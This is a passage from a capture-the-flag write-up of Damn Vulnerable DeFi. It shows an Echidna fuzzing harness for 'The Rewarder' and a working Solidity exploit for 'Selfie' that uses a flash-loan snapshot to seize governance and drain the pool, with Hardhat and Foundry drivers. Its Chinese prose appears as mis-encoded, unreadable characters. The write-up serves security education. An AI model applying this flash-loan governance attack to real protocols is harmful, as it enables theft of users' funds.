<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">warp</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="p">);</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint160</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x20000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x60000</span><span class="p">;</span><span class="w"> </span><span class="nx">u</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mh">0x10000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">hevm</span><span class="p">.</span><span class="nx">prank</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">u</span><span class="p">));</span>
<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">distributeRewards</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDeposit</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">canDeposit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setWithdraw</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">canWithdraw</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">setDistribute</span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">canDistribute</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_enabled</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">receiveFlashLoan</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">));</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canDeposit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">token</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">rewarder</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">deposit</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canWithdraw</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">amount</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">canDistribute</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">distributeRewards</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">),</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">flashLoan</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastRewardsTimestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">lastRecordedSnapshotTimestamp</span><span class="p">();</span>
<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">lastRewardsTimestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">REWARDS_ROUND_MIN_DURATION</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;It&#39;s useless to call flashLoan if no rewards can be taken as ETH is precious.&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// Thus, no need to use hevm to warp time</span>
<span class="w">        </span><span class="nx">pool</span><span class="p">.</span><span class="nx">flashLoan</span><span class="p">(</span><span class="nx">TOKENS_IN_LENDER_POOl</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">testBalance</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">rewardToken</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">rewarder</span><span class="p">.</span><span class="nx">REWARDS</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">99</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">100</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</details>
<div class="admonition note">
<p class="admonition-title">the-rewarder.yml</p>
<div class="highlight"><pre><span></span><code><span class="nx">testMode</span><span class="o">:</span><span class="w"> </span><span class="nx">assertion</span>

<span class="nx">deployer</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x10000&quot;</span>
<span class="nx">psender</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x10000&quot;</span>
<span class="nx">contractAddr</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;0x10000&quot;</span>
<span class="nx">sender</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x10000&quot;</span><span class="p">]</span>
</code></pre></div>
</div>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>echidna<span class="w"> </span>.<span class="w"> </span>--contract<span class="w"> </span>TheRewarderTest<span class="w"> </span>--config<span class="w"> </span>the-rewarder.yml<span class="w"> </span>
...
receiveFlashLoan<span class="o">(</span>uint256<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
setDistribute<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
setDeposit<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
flashLoan<span class="o">()</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
setWithdraw<span class="o">(</span>bool<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
testBalance<span class="o">()</span>:<span class="w"> </span>failed!üí•<span class="w">  </span>
<span class="w">  </span>Call<span class="w"> </span>sequence:
<span class="w">    </span>setDeposit<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
<span class="w">    </span>*wait*<span class="w"> </span>Time<span class="w"> </span>delay:<span class="w"> </span><span class="m">434239</span><span class="w"> </span>seconds<span class="w"> </span>Block<span class="w"> </span>delay:<span class="w"> </span><span class="m">16633</span>
<span class="w">    </span>setWithdraw<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
<span class="w">    </span>flashLoan<span class="o">()</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000
<span class="w">    </span>testBalance<span class="o">()</span><span class="w"> </span>from:<span class="w"> </span>0x0000000000000000000000000000000000010000

Event<span class="w"> </span>sequence:<span class="w"> </span>Panic<span class="o">(</span><span class="m">1</span><span class="o">)</span>:<span class="w"> </span>Using<span class="w"> </span>assert.
AssertionFailed<span class="o">(</span>..<span class="o">)</span>:<span class="w">  </span>passed!<span class="w"> </span>üéâ
Unique<span class="w"> </span>instructions:<span class="w"> </span><span class="m">7102</span>
Unique<span class="w"> </span>codehashes:<span class="w"> </span><span class="m">6</span>
Corpus<span class="w"> </span>size:<span class="w"> </span><span class="m">3</span>
Seed:<span class="w"> </span><span class="m">5526863836465074544</span>
</code></pre></div>
<h3 id="_4">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a></li>
<li><a href="https://hevm.dev/controlling-the-unit-testing-environment.html#cheat-codes">controlling the unit testing environment - hevm</a></li>
</ul>
<h2 id="6-selfie">6. Selfie<a class="headerlink" href="#6-selfie" title="Permanent link">&para;</a></h2>
<blockquote>
<p>A new cool lending pool has launched! It‚Äôs now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</p>
<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</p>
</blockquote>
<ul>
<li>
<p><code>governance</code> ÊâçËÉΩË∞ÉÁî® <code>emergencyExit()</code> ËΩ¨Âá∫ pool ‰∏≠ÁöÑËµÑÈáë</p>
<div class="highlight"><pre><span></span><code><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyGovernance</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">governance</span><span class="p">))</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">CallerNotGovernance</span><span class="p">();</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">emergencyExit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyGovernance</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
<span class="w">    </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>

<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">FundsDrained</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p><code>SimpleGovernance.executeAction()</code> ÂèØ‰ª•ÊâßË°åËá™ÂÆö‰πâË∞ÉÁî®</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">executeAction</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">_canBeExecuted</span><span class="p">(</span><span class="nx">actionId</span><span class="p">))</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">CannotExecute</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>

<span class="w">    </span><span class="nx">GovernanceAction</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">actionToExecute</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_actions</span><span class="p">[</span><span class="nx">actionId</span><span class="p">];</span>
<span class="w">    </span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">executedAt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>

<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">ActionExecuted</span><span class="p">(</span><span class="nx">actionId</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">returndata</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">returndata</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">revert</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="w"> </span><span class="nx">returndata</span><span class="p">),</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">returndata</span><span class="p">))</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">revert</span><span class="w"> </span><span class="nx">ActionFailed</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">returndata</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÂàõÂª∫Êñ∞ÁöÑ action ÈúÄË¶ÅÂàõÂª∫ËÄÖËé∑ÂèñË∂≥Â§üÁöÑÁ•®Êï∞ÔºåÁ•®Êï∞Âç≥ÂàõÂª∫ËÄÖÂú®ÊúÄÊñ∞Âø´ÁÖß <code>governanceToken</code> ÁöÑÊåÅÊúâÈáè</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">queueAction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">uint128</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">_hasEnoughVotes</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">NotEnoughVotes</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InvalidTarget</span><span class="p">();</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">target</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">TargetMustHaveCode</span><span class="p">();</span>

<span class="w">    </span><span class="nx">actionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_actionCounter</span><span class="p">;</span>

<span class="w">    </span><span class="nx">_actions</span><span class="p">[</span><span class="nx">actionId</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GovernanceAction</span><span class="p">({</span>
<span class="w">        </span><span class="nx">target</span><span class="o">:</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span>
<span class="w">        </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span>
<span class="w">        </span><span class="nx">proposedAt</span><span class="o">:</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">),</span>
<span class="w">        </span><span class="nx">executedAt</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
<span class="w">        </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">_actionCounter</span><span class="o">++</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>

<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">ActionQueued</span><span class="p">(</span><span class="nx">actionId</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">_hasEnoughVotes</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">who</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_governanceToken</span><span class="p">.</span><span class="nx">getBalanceAtLastSnapshot</span><span class="p">(</span><span class="nx">who</span><span class="p">);</span>
<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">halfTotalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_governanceToken</span><span class="p">.</span><span class="nx">getTotalSupplyAtLastSnapshot</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">halfTotalSupply</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•ËøõË°åÂø´ÁÖß uwu ÈÇ£‰πàÂú®Èó™ÁîµË¥∑Êó∂Âø´ÁÖßÔºåÂç≥ÂèØËé∑ÂæóÂÖÖË∂≥ÁöÑÁ•®Êï∞ÔºåÂú®‰∏ã‰∏ÄÊ¨°Âø´ÁÖßÂâç <code>queueAction()</code> Â∞±ÂèØ‰ª•Âï¶w</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">snapshot</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastSnapshotId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">lastSnapshotId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_snapshot</span><span class="p">();</span>
<span class="w">    </span><span class="nx">_lastSnapshotId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">lastSnapshotId</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../DamnValuableTokenSnapshot.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./ISimpleGovernance.sol&quot;</span><span class="p">;</span>
<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SelfiePool.sol&quot;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IERC3156FlashBorrower</span><span class="w"> </span><span class="p">{</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">pool</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">SelfiePool</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span>
<span class="w">            </span><span class="k">this</span><span class="p">,</span>
<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="nx">SelfiePool</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">token</span><span class="p">()),</span>
<span class="w">            </span><span class="mf">1500000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span>
<span class="w">            </span><span class="s2">&quot;&quot;</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">        </span><span class="nx">actionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ISimpleGovernance</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">queueAction</span><span class="p">(</span>
<span class="w">            </span><span class="nx">pool</span><span class="p">,</span>
<span class="w">            </span><span class="mf">0</span><span class="p">,</span>
<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;emergencyExit(address)&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span>
<span class="w">        </span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span>
<span class="w">        </span><span class="nx">address</span><span class="p">,</span>
<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span>
<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
<span class="w">        </span><span class="nx">uint256</span><span class="p">,</span>
<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span>
<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">snapshot</span><span class="p">();</span>
<span class="w">        </span><span class="nx">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h4 id="hardhat_1">Hardhat<a class="headerlink" href="#hardhat_1" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s1">&#39;SelfieHack&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">)).</span><span class="nx">deploy</span><span class="p">();</span>
<span class="w">    </span><span class="c1">// The return value of a non-pure non-view function is available only when the function is called and validated on-chain.</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">governance</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span><span class="w"> </span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="mf">2</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">24</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="p">]);</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">governance</span><span class="p">.</span><span class="nx">executeAction</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">governance</span><span class="p">.</span><span class="nx">getActionCounter</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
<h4 id="foundry_1">Foundry<a class="headerlink" href="#foundry_1" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Sets attacker as msg.sender for all subsequent calls until stopPrank is called</span>
<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>

